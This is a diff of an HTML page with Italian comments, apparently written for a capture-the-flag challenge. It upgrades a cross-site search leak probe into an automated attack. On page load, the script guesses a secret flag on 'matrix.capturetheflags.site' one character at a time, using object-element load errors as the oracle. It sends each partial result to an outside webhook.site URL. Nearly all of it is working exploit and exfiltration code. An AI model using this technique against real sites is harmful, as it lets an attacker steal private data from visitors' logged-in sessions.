@@ -20,6 +20,9 @@
     <div id="result">In attesa di risultati...</div>
 
     <script>
+        const validChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Caratteri validi
+        let currentFlag = ''; // Flag trovata
+
         const leak = async (url) => {
             return new Promise((resolve) => {
                 let s = document.createElement('object');
@@ -36,28 +39,8 @@
             });
         };
 
-        // Funzione da chiamare al caricamento della pagina
-        const testResourceLeak = async () => {
-            const url = 'https://matrix.capturetheflags.site/search?s=flag{asjonncuan2sqd'; // Sostituisci con l'URL da testare
-            const result = await leak(url);
-            const resultDiv = document.getElementById('result');
-
-            let message;
-            if (result === 0) {
-                resultDiv.textContent = 'Risorsa accessibile (status 200)';
-                message = 'Risorsa accessibile';
-            } else {
-                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
-                message = 'Risorsa non accessibile';
-            }
-
-            // Invia il log al server Webhook utilizzando GET
-            await logResult(message);
-        };
-
-        // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL del Webhook
             try {
                 // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
@@ -75,8 +58,35 @@
             }
         };
 
+        const guessFlag = async (position) => {
+            // Se la lunghezza della flag è nota, puoi anche fermarti se hai raggiunto quella lunghezza
+            if (position >= currentFlag.length + 10) { // Sostituisci 10 con la lunghezza massima della flag prevista
+                console.log('Flag completa:', currentFlag);
+                return;
+            }
+
+            for (let char of validChars) {
+                const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`; // URL da testare
+                const result = await leak(url); // Esegui il leak
+
+                if (result === 0) { // Risorsa accessibile (status 200)
+                    currentFlag += char; // Aggiungi carattere corretto
+                    document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
+                    console.log(`Flag parziale trovata: ${currentFlag}`);
+                    
+                    // Invia il log della flag parziale al Webhook
+                    await logResult(`Flag parziale trovata: ${currentFlag}`);
+                    
+                    await guessFlag(position + 1); // Prova il prossimo carattere
+                    return; // Esci dopo aver trovato un carattere valido
+                }
+            }
+        };
+
         // Esegui il test al caricamento del DOM
-        document.addEventListener('DOMContentLoaded', testResourceLeak);
+        document.addEventListener('DOMContentLoaded', () => {
+            guessFlag(0); // Inizia a indovinare la flag dalla posizione 0
+        });
     </script>
 </body>
 </html>
